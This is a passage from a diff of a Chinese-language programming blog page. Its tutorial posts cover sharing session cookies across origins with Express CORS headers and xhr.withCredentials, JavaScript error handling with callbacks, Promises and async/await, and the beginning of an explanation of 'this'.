class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3><span id="api-server">api server</span></h3>
+<p>另一台主要當作 api server<br>
+主要就印出 session id 來觀看每一次的 request 是不是同一個人</p>
+<pre><code class="language-javascript">const express = require('express');
+const app = express();
+const session = require('express-session')
+var sess = {
+  secret: 'keyboard cat',
+  cookie: {},
+  resave: true,
+  saveUninitialized: false,
+}
+
+const bodyParser = require('body-parser');
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({
+    extended: true
+}));
+app.use(session(sess))
+app.use((req, res, next) =&gt; {
+    res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;X-Requested-With, Accept, Content-Type, Cookie&quot;)
+    res.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;)
+    res.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS, PATCH&quot;)
+    next();
+})
+app.post('/test', (req, res) =&gt; {
+    console.log(req.sessionID);
+    req.session.a = &quot;hi&quot;
+    res.json({a: 1})
+})
+
+app.listen(7777, () =&gt; {
+    console.log('start');
+});
+</code></pre>
+<h3><span id="實作">實作</span></h3>
+<p>透過執行以上的兩個 server 程式，寫後近到 http://localhost:8080 之後<br>
+按下幾次重整，可以看到 api server 印出來的 session 每一次都是不同個<br>
+<img src="https://imgur.com/s8uwa99.png" alt></p>
+<p>接下來就是要透過 xhr 的 credential 去設定
+在 ajax 送出之前要加上 <code>ajax.withCredentials = true;</code> 這樣才可以把 Cookie 夾帶上去<br>
+但會發現瀏覽器卻爆出另一個錯誤訊息<br>
+<code>The value of the 'Access-Control-Allow-Credentials' header in the response is '' which must be 'true' when the request's credentials mode is 'include'</code><br>
+<img src="https://imgur.com/B4OEBSz.png" alt>
+這是前後端必須要同步都使用 credentials 才可以用<br>
+於是在後端 server 加上 <code>Access-Control-Allow-Credentials: true</code></p>
+<p>但再度重整之後又發現新的錯誤！
+<code>The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'.</code>
+<img src="https://imgur.com/HBreO9s.png" alt></p>
+<p>其實這也是限制的一種，當使用到 credentials 的時候，後端必須多限制只有一個 domain 能使用<br>
+<code>Access-Control-Allow-Origin: http://localhost:8888</code><br>
+這樣設定之後按幾次重整就會發現 session id 是一致的了
+<img src="https://imgur.com/DY6aSrr.png" alt></p>
+<h2><span id="重點筆記">重點筆記</span></h2>
+<h3><span id="後端必須加上以下的-headers">後端必須加上以下的 headers</span></h3>
+<ol>
+<li>Access-Control-Allow-Headers: *</li>
+<li>Access-Control-Allow-Origin: http://localhost:8888
+<blockquote>
+<p>只能指定一個 domain，不能用 * 字號</p>
+</blockquote>
+</li>
+<li>Access-Control-Allow-Methods: *</li>
+<li>Access-Control-Allow-Credentials: true</li>
+</ol>
+<p>1, 3 兩點根據需要使用的 method 和 headers 再去客製化<br>
+以資安來說建議不寫上 <code>*</code>，寫上有使用的就可以了</p>
+<h3><span id="前端則是必須在-xhr-上面加上">前端則是必須在 xhr 上面加上</span></h3>
+<ol>
+<li>xhr.withCredentials = true</li>
+</ol>
+<h2><span id="後記">後記</span></h2>
+<p>以上為簡單介紹如何在前後分離架構下依舊可以使用 session 的方式<br>
+而文章有提到 JWT，那是另一種驗證及授權方式，有機會再來談談這個技術實作的方式</p>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/06/02/ajax-with-session/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -370,17 +717,75 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <p>上一篇主要是介紹如何使用<br>這篇會介紹該如何去在每一種使用方式之中去做 Error Handling  </p>
+            <p>上一篇主要是介紹如何使用<br>
+這篇會介紹該如何去在每一種使用方式之中去做 Error Handling</p>
+<p>&lt;!-- more --&gt;</p>
+<h2><span id="callback">callback</span></h2>
+<p>相信各位有在使用別人第三方套件或是 Node.js 原生的 Library 都會發現一件事情<br>
+那就是 callback 第一個參數都會是 error<br>
+雖然這看似是一個不成文的規定，但仔細想想把 error 放在第一個是非常合理的<br>
+假設當 callback 參數回傳越來越多的時候，總不可能把 error 放在最後一個去處理<br>
+因為你會始終不知道哪一個會是 error (就算寫註解也會讀到瘋掉)<br>
+試想一下這幾段 code 就可以理解了</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">cb</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 當 function 成功後</span></span><br><span class="line">    cb(successful_data_1, successful_data_2)</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="function">(<span class="params">successful_data_1, successful_data_2</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 開心地處理兩個回傳的資料</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// --- 分隔線  </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">cb</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 當 function 失敗後</span></span><br><span class="line">    cb(error)</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 咦? 第一個到底是 error 還是我原本的 successful_data_1</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>當遇到上面的狀況就會變得非常難判斷，但如果我整體改寫成這樣就會變得輕而易舉</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">cb</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 當 function 成功後</span></span><br><span class="line">    cb(<span class="literal">null</span>, successful_data_1, successful_data_2)</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="function">(<span class="params">error, successful_data_1, successful_data_2</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">null</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 開心地處理兩個回傳的資料</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// --- 分隔線  </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">cb</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 當 function 失敗後</span></span><br><span class="line">    cb(error)</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="function">(<span class="params">error, successful_data_1, successful_data_2</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 開心地處理 error, 於是 data_1 以及 data_2 就完全不用管他們了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>當然有人會說<br>
+『啊我就把所有參數丟到第一個當 Object 全部存起來，第二個就放 Error 也是一種方式啊』<br>
+這樣講的話當然沒錯，但如果把所有東西都放在第一個 Object 裡面<br>
+這樣參數就會有分類，使用問題也只是會徒增而已<br>
+再加上這算是一種共識了，所以跟潛規則走會比較方便一點</p>
+<h2><span id="promise">promise</span></h2>
+<p>Promise 處理 error 的方式就比較特別了，我們先來看看一般 promise 出錯的時候是怎麼抓取的</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        rej(<span class="string">"this is error"</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">test().then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"Get "</span> + data)&#125;).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"handle! "</span> + error)&#125;); <span class="comment">// this is error</span></span><br></pre></td></tr></table></figure></p>
+<p>上面為一般 promise 用 rej 的方式，外面用 catch 去抓住這個錯誤<br>
+但凡事要考慮例外，萬一有一個 error 是你沒辦法 rej 到的話，那該要怎麼抓取?</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        oqiwje() <span class="comment">// non-exist function</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">test().then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"Get "</span> + data)&#125;).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"handle! "</span> + error)&#125;); <span class="comment">// this is error</span></span><br></pre></td></tr></table></figure></p>
+<p>會發現當在 Promise 裡面出錯的話，外面的 catch 也是能抓到的<br>
+其原因是因為 Promise 是有被一層內部的 try-catch 給包住<br>
+且在內部的 catch 那一邊套用了預設地 rej function<br>
+所以外面才抓得到</p>
+<p>那如果放在 Promise 外面的話呢??</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    oqiwje() <span class="comment">// non-exist function</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">test().then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"Get "</span> + data)&#125;).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"handle! "</span> + error)&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>咦!? 竟然抓不到，error 直接噴出來!<br>
+但這也不意外，因為出了 Promise 到了外面<br>
+那就是要透過自己去寫 try-catch 才能抓取到這個錯誤</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    oqiwje() <span class="comment">// non-exist function</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    test().then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"Get "</span> + data)&#125;).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"handle! "</span> + error)&#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"handled by outer try-catch"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>還有一種 Handle 方式是寫在內層 function 裡面</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        oqiwje() <span class="comment">// non-exist function</span></span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="string">"handle by inner function"</span>)</span><br><span class="line">&#125;</span><br><span class="line">test().then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"Get "</span> + data)&#125;).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"handle! "</span> + error)&#125;); <span class="comment">// Get handle by inner function</span></span><br></pre></td></tr></table></figure></p>
+<p>那因為在 inner function 裡面被抓取到，並且回傳<br>
+還記得 promise chain 中，如果 return 的話是會到下一個 then 去的<br>
+所以這邊會被外面的 then 給抓到，而不是 catch，這邊要注意</p>
+<p>Promise 的 Error Handling 只要能確保能執行到 rej 就沒什麼問題了<br>
+然而在 Promise 之前用 try-catch 包起來或程式都丟到 Promise 裡面等他報錯丟出來也可以處理到</p>
+<h2><span id="asyncawait">async/await</span></h2>
+<p>await catch error 的方式可以想成一般 try-catch 的方式</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        rej(<span class="string">"QQQ"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> test()</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Handled by main"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
+<p>而要特別注意的是，如果把 catch 寫在外面的 await 那裡的話<br>
+會造成程式不會往最外層的 catch 前進</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        rej(<span class="string">"QQQ"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> test().catch(<span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"Handled by await"</span>)&#125;)</span><br><span class="line">        <span class="comment">// 因為有正確被 handle 到，所以程式是會繼續下去執行的</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Still going"</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Handled by main"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
+<p>但如果透過在 catch function 裡面把 error 再次 throw 出來的話，是可以成功 throw 出來</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        rej(<span class="string">"QQQ"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> test().catch(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Handled by await"</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"QQQQ"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// 因為在上面做 throw error，所以程式不會繼續走下去</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Still going"</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Handled by main"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
+<p>千萬要注意 return 和 throw 的方式會帶來不一樣的結果<br>
+使用 return 就跟 Promise 的 reject 的狀態下 return 是一樣的<br>
+他會回傳到下一個 then 裡面 (也就是 resolved 的狀態)</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        rej(<span class="string">"QQQ"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> test().catch(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Handled by await"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"QQQQ"</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// 因為在上面做 return, 相當於是把結果回傳到 result 裡面了</span></span><br><span class="line">        <span class="built_in">console</span>.log(result); <span class="comment">// Error: QQQQ</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Still going"</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Handled by main"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
+<p>而個人比較不建議的寫法是在 await 那一層做 Error Handling<br>
+而是盡量再底層那裡做 throw error 到最外面的 try-catch 去接<br>
+原因是這跟 Design Pattern 有關係<br>
+最外層的 main 可以想像是 Controller，而 test 可以想像成 Facade<br>
+在裡面得程式才是真正的商業邏輯<br>
+從下面程式來解讀的話，回家主要目的是要做功課<br>
+那做功課一定會有流程，像是先吃飯，洗澡，最後在讀書這樣的順序<br>
+但要怎麼吃飯洗澡讀書是要寫在每一個該做的項目的最裡面，而不會寫在順序那一層<br>
+這樣程式撰寫上會比較乾淨一點</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">eatFirst</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            res(<span class="string">"Error"</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBook</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            res(<span class="string">"Error"</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeIt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            rej(<span class="string">"Books are ate by dogs!!!"</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">doHomeWork</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> eatFirst()</span><br><span class="line">    <span class="keyword">await</span> getBook()</span><br><span class="line">    <span class="keyword">await</span> writeIt()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> doHomeWork();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Handled by main"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">main();</span><br></pre></td></tr></table></figure></p>
+<h2><span id="後記">後記</span></h2>
+<p>這次主要介紹 Error Handling 的方式<br>
+也加了一些個人建議撰寫的方法，如果有其他想法歡迎大家來討論！</p>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/05/02/promise-2/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -424,17 +829,92 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信寫過 js 的人對於 this 都有一定的認識<br>但要搞懂它真的不容易，js 的 this 並沒有其他語言的 this 那麼單純<br>所以這邊要一步一步的去展示並介紹 js 中的 this 到底是怎麼一回事<br>以及最後面教學如何一步一步判定 this 會是指向什麼</p>
+            <h2><span id="前言">前言</span></h2>
+<p>相信寫過 js 的人對於 this 都有一定的認識<br>
+但要搞懂它真的不容易，js 的 this 並沒有其他語言的 this 那麼單純<br>
+所以這邊要一步一步的去展示並介紹 js 中的 this 到底是怎麼一回事<br>
+以及最後面教學如何一步一步判定 this 會是指向什麼</p>
+<p>&lt;!-- more --&gt;</p>
+<h2><span id="this-是什麼">this 是什麼 ？</span></h2>
+<p>this 單純看英文解釋的話，是代表『自身』<br>
+聽起來好像有這麼一回事，但實際上使用起來根本不是這樣<br>
+實際上 js 中 this 代表的是執行時的對象，並不代表自身<br>
+簡單來就說就是找<em>函數被調用的位置</em></p>
+<p>讓我們看看以下的範例</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( <span class="string">`foo: <span class="subst">$&#123;num&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">this</span>.count++;</span><br><span class="line">&#125;</span><br><span class="line">foo.count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">7</span>) &#123;</span><br><span class="line">        foo(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// foo: 8</span></span><br><span class="line"><span class="comment">// foo: 9</span></span><br><span class="line"><span class="comment">// foo 被調用多少次</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.count) <span class="comment">// 0 --- ??? 為什麼是 0 ??</span></span><br></pre></td></tr></table></figure></p>
+<p>雖然 console.log 真的有跑出來 foo 的兩個輸出<br>
+但 foo.count 卻還是 0<br>
+這其中的原因是，真正執行 foo 調用的位置的地方是<em>全域(瀏覽器中為 window 物件)</em>
+注意到這點回去可以執行這行 <code>window.count</code> 會發現為 NaN，卻不是 undefined</p>
+<p>那我在這邊該如何去把 <code>this.count</code> 綁定到我的 <code>foo.count</code> 上面呢?<br>
+這裡可以透過 <code>fn.call(thisArg, arg)</code> 的方式把我們的 this 綁定到 foo 上面<br>
+在 for loop 之中調用 foo 得方式更改為 <code>foo.call(foo, i)</code> 就可以完成綁定<br>
